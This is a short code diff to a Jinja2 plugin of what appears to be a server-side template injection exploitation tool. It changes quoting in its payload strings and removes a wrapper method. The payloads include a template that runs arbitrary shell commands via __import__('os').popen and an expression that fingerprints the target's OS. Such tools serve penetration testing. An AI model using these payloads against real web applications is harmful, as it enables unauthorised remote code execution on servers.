@@ -37,7 +37,7 @@ class Jinja2(Plugin):
         },
         'execute' : {
             'call': 'evaluate',
-            'execute': """__import__("os").popen("%(code)s").read()"""
+            'execute': """__import__('os').popen('%(code)s').read()"""
         },
         'blind' : {
             'call': 'blind_evaluate',
@@ -87,17 +87,13 @@ class Jinja2(Plugin):
 
     def detect_eval(self):
 
-        payload = """"-".join([__import__("os").name, __import__("sys").platform])"""
+        payload = """'-'.join([__import__('os').name, __import__('sys').platform])"""
         self.set('os', self.evaluate(payload))
         self.set('eval', 'python')
 
     def evaluate(self, code, prefix = '', suffix = '', blind = False):
         # Quote code before submitting it
         return super(Jinja2, self).evaluate(quote(code), prefix, suffix, blind)
-
-    def execute(self, code):
-        # Quote code before submitting it
-        return super(Jinja2, self).execute(quote(code))
 
     def detect_blind_engine(self):
 
